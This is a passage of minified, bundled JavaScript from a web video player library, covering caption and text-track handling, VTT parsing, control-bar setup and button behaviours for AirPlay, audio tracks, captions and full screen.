e=this._video.getTextTracks();e&&e.length&&(e=e.filter((function(e){return"showing"===e.mode}))),e.length?(this._activeTrack=e[0],this._addVideoListeners(this._activeTrack)):(this._activeTrack=null,this._removeVideoListeners()),this._refreshCurrentCaption()}},{key:"_getCurrentCaptionText",value:function(e){var t=this._activeTrack?this._activeTrack.cues:null;if(!t)return"";if(this._currentCaption&&this._currentCaption.startTime>=e&&this._currentCaption<=e)return this._currentCaption.text;for(var n=0,i=t.length,r=void 0;n<i;){if(t[n].startTime<=e&&t[n].endTime>=e)r=t[n];else if(t[n].startTime>=e)break;n++}return this._currentCaption=r,r?r.text:""}},{key:"_refreshCurrentCaption",value:function(){this._view.setText(this._getCurrentCaptionText(this._video.getCurrentTime()))}},{key:"destroy",value:function(){this._removeVideoListeners()}}]),e}();t.exports=a},{"./parseVTT":327,"@marcom/ac-ajax-xhr":35,"@marcom/ac-function/throttle":156}],321:[function(e,t,n){"use strict";var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),r=function e(t,n,i){null===t&&(t=Function.prototype);var r=Object.getOwnPropertyDescriptor(t,n);if(void 0===r){var o=Object.getPrototypeOf(t);return null===o?void 0:e(o,n,i)}if("value"in r)return r.value;var s=r.get;return void 0!==s?s.call(i):void 0},o=e("../ui/factory/createComponents"),s=e("./TextTracksBehavior"),a=e("../ui/elements/Label"),c=e("@marcom/ac-event-emitter-micro").EventEmitterMicro,l={textTracksPolyfill:{className:"ac-video-player-text-track",view:{classDef:a,options:{}},behavior:{classDef:s}}},u=function(e){function t(e){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t);var n=function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!=typeof t&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e));return n.container=e.container,n._video=e.video,n._initialize(e),n}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+typeof t);e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,e),i(t,[{key:"_initialize",value:function(e){this._onTrackChange=this._onTrackChange.bind(this),this.el=document.createElement("div"),this.el.innerHTML=e.template||'<div class="ac-video-player-text-track"></div>',this.el.classList.add("ac-video-player-text-track-container"),this._tracks=e.tracks||[],this._textTrackComponent=o(this.el,l,{video:this._video})}},{key:"_onTrackChange",value:function(){this.trigger("change"),this.el.parentElement||(this._video.getRenderElement().parentElement.appendChild(this.el),this.el.firstElementChild.classList.add("is-visible"))}},{key:"addTrack",value:function(e){this._tracks||(this._tracks=[]);var t=e.mode||"hidden",n=this._onTrackChange;Object.defineProperty(e,"mode",{get:function(){return t},set:function(e){t=e,n()},enumerable:!0,configurable:!0}),this._tracks.push(e),this.trigger("addtrack")}},{key:"clearTracks",value:function(){this._tracks=[],this.trigger("removetrack"),this.trigger("change")}},{key:"getTextTracks",value:function(){return this._tracks}},{key:"trigger",value:function(e,n){return r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"trigger",this).call(this,e,Object.assign({type:e},n||{}))}},{key:"destroy",value:function(){this._textTrackComponent.destroy(),r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"destroy",this).call(this)}}]),t}(c);t.exports=u},{"../ui/elements/Label":355,"../ui/factory/createComponents":365,"./TextTracksBehavior":320,"@marcom/ac-event-emitter-micro":122}],322:[function(e,t,n){"use strict";var i,r=e("@marcom/useragent-detect");i=r.browser.safari?function(e,t){e.track.mode=t}:function(e,t){e.mode=t};var o=function(e){var t;if(e instanceof HTMLElement)this.el.appendChild(e);else{var n=document.createElement("track");n.src=e.src,n.kind="captions",n.srclang=e.srclang,"en"===n.srclang?n.label=e.label||"English":n.label=e.label||e.srclang&&e.srclang.toUpperCase()||"Unknown CC",r.browser.firefox?(t=this.el.textTracks.length,setTimeout(function(){this.el.appendChild(n),i(this.el.textTracks[t],e.mode||"hidden")}.bind(this),0)):r.os.android?(t=this.el.textTracks.length,this.el.appendChild(n),i(this.el.textTracks[t],e.mode||"hidden")):(this.el.appendChild(n),i(n,e.mode||"hidden")),this.trigger("TextTrackChange")}};t.exports={create:function(e){for(var t=0,n=e?e.length:0;t<n;t++){var i=e[t];o.call(this,i)}},add:o,get:function(){return this.el.textTracks},getEmitter:function(){if(!this._textTracksEmitter){var t=e("../dom-emitter/DOMEmitterMicro");this._textTracksEmitter=new t(this.getTextTracks())}return this._textTracksEmitter},destroy:function(){}}},{"../dom-emitter/DOMEmitterMicro":309,"@marcom/useragent-detect":435}],323:[function(e,t,n){"use strict";var i=e("./TextTracksDOM");t.exports={create:function(e){if(e)if(this._textTracksPolyfill){this._textTracksPolyfill.clearTracks();for(var t=0,n=e.length;t<n;t++)this._textTracksPolyfill.addTrack(e[t])}else this._textTracksPolyfill=new i({video:this,tracks:e,container:this._parentElement})},add:function(e){return this._textTracksPolyfill.addTrack(e)},get:function(){return this._textTracksPolyfill||this._createTextTrackTags([]),this._textTracksPolyfill.getTextTracks()},getEmitter:function(){return this._textTracksPolyfill||this._createTextTrackTags([]),this._textTracksPolyfill},destroy:function(){this._textTracksPolyfill.destroy(),this._textTracksPolyfill=null}}},{"./TextTracksDOM":321}],324:[function(e,t,n){"use strict";var i=e("@marcom/useragent-detect"),r=!i.browser.ie&&!i.browser.edge;t.exports=function(t){var n;return n=!!(t=t||{}).hls||!t.threesixty&&(void 0===t.useNativeCaptions?r:t.useNativeCaptions),e(n?"./TextTracksNative":"./TextTracksPolyfill")}},{"./TextTracksNative":322,"./TextTracksPolyfill":323,"@marcom/useragent-detect":435}],325:[function(e,t,n){"use strict";t.exports=function(e,t){var n=[],i=!0,r=!1,o=void 0;try{for(var s,a=t[Symbol.iterator]();!(i=(s=a.next()).done);i=!0){var c=s.value;c!==e&&c.language===e.language&&n.push(c)}}catch(e){r=!0,o=e}finally{try{!i&&a.return&&a.return()}finally{if(r)throw o}}return n}},{}],326:[function(e,t,n){"use strict";t.exports=function(e){var t=new Set;return e.filter((function(e){return!(t.has(e.language)||"subtitles"!==e.kind&&"captions"!==e.kind&&e.kind||(t.add(e.language),0))}))}},{}],327:[function(e,t,n){"use strict";var i=e("../utils/Time");t.exports=function(e){for(var t,n,r=e.split(/\n/),o=/([\d]{2}:)?[\d]{2}:[\d]{2}.[\d]{3}( --> ){1}([\d]{2}:)?[\d]{2}:[\d]{2}.[\d]{3}/,s=[],a=0,c=r.length;a<c;a++)if(n="",o.test(r[a])){for((t=r[a].split(" --\x3e "))[0]=t[0].split(":").length<3?"00:"+t[0]:t[0],t[1]=t[1].split(":").length<3?"00:"+t[1]:t[1];++a&&a<c&&!o.test(r[a]);)""!==r[a]&&(n+=r[a]+"<br />");n=n.substr(0,n.length-6),a<c&&a--,s.push({startTime:i.stringToNumber(t[0].split(" ")[0]),endTime:i.stringToNumber(t[1].split(" ")[0]),text:n})}return s}},{"../utils/Time":388}],328:[function(e,t,n){"use strict";var i=e("@marcom/ac-string/supplant"),r=e("../utils/Time"),o=e("./localization/Localization"),s=e("./factory/createComponents"),a=e("@marcom/useragent-detect").browser.chrome,c=e("@marcom/ac-feature/isDesktop")(),l=e("./overlays/OverlayContainer"),u=e("./end-state/EndStateItemContainer"),h=e("./compass/Compass"),d=e("./loading-indicator/LoadingIndicator"),p=e("../utils/merge"),f=e("./templates/default-controls.html"),m=function(e){this._initialize(e)},_=m.prototype;_._initialize=function(e){this.el=e.element||document.createElement("div"),this._basePath=e.basePath,this._forceEnglishLabels=e.forceEnglishLabels,this.el.style.display="none",this._template=e.template||f,this._templateData=e.templateData||Object.assign({elementClassPrefix:"controls"}),this._destroyed=!1,this._localize().then(function(){this._destroyed||(this._initUIComponents(e),this.el.style.display=""),"function"==typeof e.readyCallback&&e.readyCallback()}.bind(this))},_._localize=function(){return new Promise(function(e){o.getTranslation({callback:function(t){e(t)}.bind(this),basePath:this._basePath,forceEnglishLabels:this._forceEnglishLabels})}.bind(this)).then(function(e){this._templateData=Object.assign(this._templateData,e)}.bind(this))},_._renderTemplateMarkup=function(){var e=i(this._template,this._templateData),t=this._updateAxTracksSelector.bind(this);this.el.innerHTML=e,this.tracksSelectorContainer=this.el.querySelector(".ac-video-ax-tracks-selector-container"),this.captionsSelectorContainer=this.el.querySelector(".ac-video-captions-selector-container"),this._updateAxTracksSelector(),this._player._videoImpl.on("TextTrackChange",t),this._player.on("AudioTrackChange",t)},_._updateAxTracksSelector=function(){var e=!!this._player.getTextTracks().length,t=!!(this._player.getAudioTracks().length>1);!e&&t?(this.tracksSelectorContainer.classList.add("no-captions"),this.captionsSelectorContainer.classList.add("hidden")):e&&(this.tracksSelectorContainer.classList.remove("no-captions"),this.captionsSelectorContainer.classList.remove("hidden"))},_._initDesktopControls=function(e,t){this._componentCollection=s(e,p(t,{elementClassPrefix:this._templateData.elementClassPrefix,elapsedTimeIndicator:{behavior:{observe:{source:this._player,events:["loadstart","timeupdate","seeking","seeked","durationchange"],update:function(e){if(this._player.isDvr()){var t=this._player.getCurrentTime();e.setText(isNaN(t)?"0:00:00":r.formatTime(t,1/0,2))}else e.setText(r.formatTime(this._player.getCurrentTime(),this._player.getDuration()))}.bind(this)}}},remainingTimeIndicator:{behavior:{observe:{source:this._player,events:["timeupdate","seeking","seeked","durationchange"],update:function(e){e.setText(r.formatTime(this._player.getCurrentTime()-this._player.getDuration(),this._player.getDuration()))}.bind(this)}}},volumeLevel:{view:{options:{value:this._player.getMuted()?0:100*this._player.getVolume()}}},playPauseContainer:{view:{options:{labels:{playing:this._templateData.pause,paused:this._templateData.play,ended:this._templateData.replay}}}},fullScreen:{view:{options:{labels:{initial:this._templateData.fullscreen,on:this._templateData.exitfullscreen,off:this._templateData.fullscreen}}}},pictureInPictureToggle:{view:{options:{labels:{initial:this._templateData.pictureinpicture,on:this._templateData.exitpictureinpicture,off:this._templateData.pictureinpicture}}}}}),{player:this._player,localization:this._templateData})},_._initUIComponents=function(e){this._player=e.player;var t=this.el,n=e.components;t.classList.add(e.className||"ac-video-controls"),a&&(t.style.willChange="transform"),this._renderTemplateMarkup();var i=t.querySelector(".main-controls-container");i&&(e.enableMainControls?(i.classList.add("control-bar-skin-default"),this.mainControlsElement=i):i.parentElement.removeChild(i));var r=t.querySelector(".end-state-container");r&&(this.endState=new u(Object.assign({},{el:r,player:this._player},e.endState))),e.threesixty&&(this.compass=new h({rootElement:t,player:this._player})),this._initDesktopControls(t,n);var o=this._componentCollection.components.socialShare;this.sharingModule=o&&o.length?o[0].behavior.sharingModule:null,this._componentCollection.components.progressBar.length&&(this.scrubberView=this._componentCollection.components.progressBar[0].view),this.playButtonElement=this.el.querySelector(".controls-play-pause-button"),this.axListSelector=this.el.querySelector(".ac-video-ax-tracks-selector-container"),c&&e.enableMainControls&&(this.overlays=new l({el:this.el.querySelector(".ac-video-overlay-container"),player:this._player})),this._loadingIndicator=new d({player:this._player,el:this.el.querySelector(".loading-indicator-container")})},_.destroy=function(){this._componentCollection&&(this._componentCollection.destroy(),this._componentCollection=null),this._loadingIndicator&&(this._loadingIndicator.destroy(),this._loadingIndicator=null),this.overlays&&this.overlays.destroy(),this._destroyed=!0,this._player=null,this._templateData=null},t.exports=m},{"../utils/Time":388,"../utils/merge":392,"./compass/Compass":348,"./end-state/EndStateItemContainer":362,"./factory/createComponents":365,"./loading-indicator/LoadingIndicator":370,"./localization/Localization":373,"./overlays/OverlayContainer":375,"./templates/default-controls.html":379,"@marcom/ac-feature/isDesktop":127,"@marcom/ac-string/supplant":300,"@marcom/useragent-detect":435}],329:[function(e,t,n){"use strict";var i={components:e("./DefaultComponents"),controlsImplementation:e("./ControlBar")};t.exports=function(e){e=e||{};var t=Object.assign({},i,e);return{create:function(n){var r=Object.assign({},t,n);return r.components=e.components||i.components,new r.controlsImplementation(r)}}}},{"./ControlBar":328,"./DefaultComponents":331}],330:[function(e,t,n){"use strict";t.exports=[{name:"small",minWidth:0,maxWidth:569},{name:"medium",minWidth:570,maxWidth:779},{name:"large",minWidth:780,maxWidth:1/0}]},{}],331:[function(e,t,n){"use strict";var i=e("./elements/Button"),r=e("./elements/StatefulButton"),o=e("./elements/ToggleButton"),s=e("./elements/Label"),a=e("./elements/ListSelector"),c=e("./elements/Slider"),l=e("./elements/Container"),u=e("./behaviors/MuteButtonBehavior"),h=e("./behaviors/PlayPauseButtonBehavior"),d=e("./behaviors/PictureInPictureButtonBehavior"),p=e("./behaviors/CaptionsButtonBehavior"),f=e("./behaviors/CaptionsSelectorBehavior"),m=e("./behaviors/AudioTracksSelectorBehavior"),_=e("./behaviors/FullScreenButtonBehavior"),v=e("./behaviors/ProgressBarSliderBehavior"),g=e("./behaviors/VolumeSliderBehavior"),y=e("./behaviors/SharingButtonBehavior"),b=e("./behaviors/SocialContainerBehavior"),w=e("./behaviors/AirPlayButtonBehavior"),E=e("./behaviors/LiveButtonBehavior"),k=e("./elements/mixins/CursorPointer"),x=e("./templates/progress-slider.html"),S=e("./templates/volume-slider.html");t.exports={back30Seconds:{className:"back-30-seconds-button",view:{classDef:i}},gotoLive:{className:"progress-dvr-label-container",view:{classDef:o,options:{states:{initial:"not-live",on:"live",off:"not-live"},labels:{initial:"livestream",on:"livestream",off:"livestream"}}},behavior:{classDef:E}},fullScreen:{className:"full-screen-button",view:{classDef:o,options:{states:{initial:"fullscreen-unsupported",on:"is-fullscreen",off:""},labels:{initial:"fullscreen",on:"exitfullscreen",off:"fullscreen"}}},behavior:{classDef:_}},toggleMuteVolume:{className:"toggle-mute-volume-button",view:{classDef:o,options:{states:{initial:[],on:["is-muted"],off:[]}}},behavior:{classDef:u}},playPauseContainer:{className:"play-pause-button-container",view:{classDef:r,options:{states:{playing:["is-playing"],paused:[],ended:["is-ended"]}}},behavior:{classDef:h}},pictureInPictureToggle:{className:"picture-in-picture-button",view:{classDef:o,options:{states:{initial:["picture-in-picture-unsupported"],on:["is-picture-in-picture"],off:[]},labels:{initial:"pictureinpicture",on:"exitpictureinpicture",off:"pictureinpicture"}}},behavior:{classDef:d}},captionsToggle:{className:"text-tracks-toggle-button",view:{classDef:o,options:{states:{initial:["no-text-tracks"],on:["text-tracks-visible"],off:[]}}},behavior:{classDef:p}},audioTracksSelector:{className:"audio-selector",view:{classDef:a},behavior:{classDef:m}},captionsSelector:{className:"captions-selector",view:{classDef:a},behavior:{classDef:f}},airplayToggle:{className:"airplay-button",view:{classDef:o,options:{states:{initial:["airplay-unsupported"],on:["airplay-active"],off:[]}}},behavior:{classDef:w}},elapsedTimeIndicator:{className:"elapsed-time",view:{classDef:s}},remainingTimeIndicator:{className:"remaining-time",view:{classDef:s}},progressBar:{className:"progress-indicator",view:{classDef:c,options:{template:x,min:0,max:1,mixins:[k],orientation:"horizontal"}},behavior:{classDef:v}},volumeLevel:{className:"volume-level-indicator",view:{classDef:c,options:{template:S,min:0,max:100,mixins:[k],orientation:"vertical"}},behavior:{classDef:g}},sharing:{className:"sharing-button",view:{classDef:r,options:{states:{initial:["sharing-unsupported"],on:["is-sharing"],off:[]}}},behavior:{classDef:y}},socialShare:{className:"social-tray",view:{classDef:l,options:{}},behavior:{classDef:b}}}},{"./behaviors/AirPlayButtonBehavior":332,"./behaviors/AudioTracksSelectorBehavior":333,"./behaviors/CaptionsButtonBehavior":336,"./behaviors/CaptionsSelectorBehavior":337,"./behaviors/FullScreenButtonBehavior":338,"./behaviors/LiveButtonBehavior":339,"./behaviors/MuteButtonBehavior":340,"./behaviors/PictureInPictureButtonBehavior":341,"./behaviors/PlayPauseButtonBehavior":342,"./behaviors/ProgressBarSliderBehavior":343,"./behaviors/SharingButtonBehavior":344,"./behaviors/SocialContainerBehavior":345,"./behaviors/VolumeSliderBehavior":346,"./elements/Button":353,"./elements/Container":354,"./elements/Label":355,"./elements/ListSelector":356,"./elements/Slider":357,"./elements/StatefulButton":358,"./elements/ToggleButton":359,"./elements/mixins/CursorPointer":360,"./templates/progress-slider.html":381,"./templates/volume-slider.html":385}],332:[function(e,t,n){"use strict";var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),r=function e(t,n,i){null===t&&(t=Function.prototype);var r=Object.getOwnPropertyDescriptor(t,n);if(void 0===r){var o=Object.getPrototypeOf(t);return null===o?void 0:e(o,n,i)}if("value"in r)return r.value;var s=r.get;return void 0!==s?s.call(i):void 0},o=function(e){function t(e,n){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t);var i=function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!=typeof t&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e,n));return i._player.supportsAirPlay()&&(i._airplayStateChange=i._airplayStateChange.bind(i),i._player.getMediaElement().addEventListener("webkitplaybacktargetavailabilitychanged",i._airplayStateChange),i._updateState=i._updateState.bind(i),i._player.getMediaElement().addEventListener("webkitcurrentplaybacktargetiswirelesschanged",i._updateState)),i}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+typeof t);e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,e),i(t,[{key:"_airplayStateChange",value:function(e){"available"===e.availability?this._airplayAvailable=!0:this._airplayAvailable=!1,this._updateState()}},{key:"_updateState",value:function(){this._player.getMediaElement().webkitCurrentPlaybackTargetIsWireless?this._view.setState("on"):this._airplayAvailable?this._view.setState("off"):this._view.setState("initial")}},{key:"_onClick",value:function(){this._player.getMediaElement().webkitShowPlaybackTargetPicker()}},{key:"destroy",value:function(){this._player.getMediaElement().removeEventListener("webkitplaybacktargetavailabilitychanged",this._airplayStateChange),this._player.getMediaElement().removeEventListener("webkitcurrentplaybacktargetiswirelesschanged",this._updateState),r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"destroy",this).call(this)}}]),t}(e("./ButtonBehavior"));t.exports=o},{"./ButtonBehavior":335}],333:[function(e,t,n){"use strict";var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),r=e("./BaseBehavior"),o=e("../localization/LanguageMapping"),s=function(e){function t(e,n){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t);var i=function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!=typeof t&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e,n));return i._updateState(),i}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+typeof t);e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,e),i(t,[{key:"_addViewListeners",value:function(){this._onSelected=this._onSelected.bind(this),this._view.on("ItemSelected",this._onSelected)}},{key:"_addPlayerListeners",value:function(){this._updateState=this._updateState.bind(this),this._player.on("AudioTrackChange",this._updateState),this._player.on("loadedmetadata",this._updateState),this._player.on("playing",this._updateState),this._player.on("play",this._updateState)}},{key:"_updateState",value:function(){var e=function(e){var t=[],n=function(e){t.some((function(t){return t.language===e.language&&t.kind===e.kind}))||t.push(e)},i=!0,r=!1,o=void 0;try{for(var s,a=e[Symbol.iterator]();!(i=(s=a.next()).done);i=!0)n(s.value)}catch(e){r=!0,o=e}finally{try{!i&&a.return&&a.return()}finally{if(r)throw o}}return t}(this._player.getAudioTracks());if(e.length<2)return this._view.setItems([]),void this._view.hide();var t=Array.from(e).map((function(e){var t=e.enabled,n=e.language,i=o[e.language],r=e.label;r||(r="description"===e.kind?i?o[e.language]+" Audio Descriptions":"Audio Descriptions ("+e.language+")":i?o[e.language]:e.language);var s={label:r,language:n,enabled:t};return Object.defineProperty(s,"enabled",{get:function(){return e.enabled},set:function(t){e.enabled=t}}),s}));this._view.setItems(t),this._view.show()}},{key:"_onSelected",value:function(e){var t=this._player.getAudioTracks(),n=e.detail,i=n.label,r=n.language,o=t.find((function(e){return e.label===i&&e.language===r}));t.forEach((function(e){return e.enabled=e===o})),setTimeout(this._updateState)}},{key:"destroy",value:function(){this._player.off("loadedmetadata",this._updateState),this._player.off("playing",this._updateState),this._player.off("play",this._updateState),this._player.off("AudioTrackChange",this._updateState)}}]),t}(r);t.exports=s},{"../localization/LanguageMapping":372,"./BaseBehavior":334}],334:[function(e,t,n){"use strict";t.exports=function e(t,n){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),this._player=n.player,this._view=t,this._addViewListeners&&this._addViewListeners(),this._addPlayerListeners&&this._addPlayerListeners()}},{}],335:[function(e,t,n){"use strict";var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),r=function(e){function t(e,n){return function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t),function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!=typeof t&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e,n))}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+typeof t);e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,e),i(t,[{key:"_initialize",value:function(){this._onClick=this._onClick.bind(this)}},{key:"_addViewListeners",value:function(){this._initialize(),this._view.on("click",this._onClick)}},{key:"_onClick",value:function(e){}},{key:"destroy",value:function(){this._view.off("click",this._onClick)}}]),t}(e("./BaseBehavior"));t.exports=r},{"./BaseBehavior":334}],336:[function(e,t,n){"use strict";var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),r=function e(t,n,i){null===t&&(t=Function.prototype);var r=Object.getOwnPropertyDescriptor(t,n);if(void 0===r){var o=Object.getPrototypeOf(t);return null===o?void 0:e(o,n,i)}if("value"in r)return r.value;var s=r.get;return void 0!==s?s.call(i):void 0},o=e("./ButtonBehavior"),s=e("../../texttracks/getFilteredTextTracks"),a=e("../../utils/Storage"),c=e("@marcom/useragent-detect").browser,l=c.edge||c.ie||c.firefox,u=function(e){function t(e,n){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t);var i=function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!=typeof t&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e,n));return i._updateState(),i._allowMultiLanguageCaptions=!i._player.options.disableMultiLanguageCaptions,i}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+typeof t);e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,e),i(t,[{key:"_updateState",value:function(){var e=this._player.getAudioTracks(),t=this._player.getVisibleTextTracks(),n=s(this._player.getTextTracks());t.length||e.length?this._view.setState("on"):n.length?this._view.setState("off"):this._view.setState("initial")}},{key:"_addPlayerListeners",value:function(){this._updateState=this._updateState.bind(this),this._player.on("addtrack",this._updateState),this._player.on("change",this._updateState),this._player.on("removetrack",this._updateState),this._player.on("AudioTrackChange",this._updateState)}},{key:"_onClick",value:function(){var e=this._player.getVisibleTextTracks(),t=s(this._player.getTextTracks()),n=this._player.getAudioTracks();t.length>1&&this._allowMultiLanguageCaptions||n.length>1?this._player.isCaptionsSelectorShowing()?this._player.hideCaptionsSelector():this._player.showCaptionsSelector():1===e.length?(t[0].mode="hidden",a.setItem("cc-disabled",!0)):(t[0].mode="showing",a.removeItem("cc-disabled")),l&&this._player.getMediaElement().textTracks.dispatchEvent(new CustomEvent("change")),setTimeout(this._updateState)}},{key:"destroy",value:function(){this._player.off("addtrack",this._updateState),this._player.off("change",this._updateState),this._player.off("removetrack",this._updateState),r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"destroy",this).call(this)}}]),t}(o);t.exports=u},{"../../texttracks/getFilteredTextTracks":326,"../../utils/Storage":387,"./ButtonBehavior":335,"@marcom/useragent-detect":435}],337:[function(e,t,n){"use strict";var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),r="__CC_DISABLE",o=e("./BaseBehavior"),s=e("@marcom/useragent-detect").browser,a=s.edge||s.ie||s.firefox,c=e("../localization/Localization"),l=e("../localization/LanguageMapping"),u=e("../../texttracks/getFilteredTextTracks"),h=e("../../texttracks/findMatchingTextTracks"),d=e("../../utils/Storage"),p=function(e){function t(e,n){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t);var i=function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!=typeof t&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e,n));return i._updateState(),i}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+typeof t);e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,e),i(t,[{key:"_addViewListeners",value:function(){this._onSelected=this._onSelected.bind(this),this._view.on("ItemSelected",this._onSelected)}},{key:"_updateState",value:function(){var e=this,t=!0,n=u(this._player.getTextTracks()).map((function(n){var i="",r=h(n,e._player.getTextTracks());if(n.label&&"en"!==n.language&&"English"!==n.language&&n.label!==n.language){var o=n.language&&n.language.replace(/_/g,"-");i=n.label+" ("+(l[o]||n.language)+")"}("showing"===n.mode||r.length&&r.some((function(e){return"showing"===e.mode})))&&(t=!1);var s={label:i||n.label||n.language||n.srclang&&("en"===n.srclang.toLowerCase()?"English":n.srclang)||"Unknown CC",language:n.language};return Object.defineProperty(s,"enabled",{get:function(){var e="hidden";return("showing"===n.mode||r.length&&r.some((function(e){return"showing"===e.mode})))&&(e="showing"),"showing"===e},set:function(e){n.mode=e?"showing":"hidden";var t=!0,i=!1,o=void 0;try{for(var s,a=r[Symbol.iterator]();!(t=(s=a.next()).done);t=!0)s.value.mode=e?"showing":"hidden"}catch(e){i=!0,o=e}finally{try{!t&&a.return&&a.return()}finally{if(i)throw o}}}}),s}));this._view.setItems([{label:c.getTranslation().captionsoff,language:r,enabled:t}].concat(n))}},{key:"_addPlayerListeners",value:function(){this._updateState=this._updateState.bind(this),this._player.on("addtrack",this._updateState),this._player.on("change",this._updateState),this._player.on("removetrack",this._updateState)}},{key:"_onSelected",value:function(e){var t=e.detail;this._player.getVisibleTextTracks().forEach((function(e){e.mode="hidden"})),t.language!==r?(t.enabled=!0,d.removeItem("cc-disabled")):d.setItem("cc-disabled",!0),a&&this._player.getMediaElement().textTracks.dispatchEvent(new CustomEvent("change")),setTimeout(this._updateState)}},{key:"destroy",value:function(){this._player.off("addtrack",this._updateState),this._player.off("change",this._updateState),this._player.off("removetrack",this._updateState),this._view.off("ItemSelected",this._onSelected)}}]),t}(o);t.exports=p},{"../../texttracks/findMatchingTextTracks":325,"../../texttracks/getFilteredTextTracks":326,"../../utils/Storage":387,"../localization/LanguageMapping":372,"../localization/Localization":373,"./BaseBehavior":334,"@marcom/useragent-detect":435}],338:[function(e,t,n){"use strict";var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),r=function e(t,n,i){null===t&&(t=Function.prototype);var r=Object.getOwnPropertyDescriptor(t,n);if(void 0===r){var o=Object.getPrototypeOf(t);return null===o?void 0:e(o,n,i)}if("value"in r)return r.value;var s=r.get;return void 0!==s?s.call(i):void 0},o=function(e){function t(e,n){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t);var i=function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!=typeof t&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e,n));return i._player.getFullScreenEnabled()&&i._updateState(),i}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super 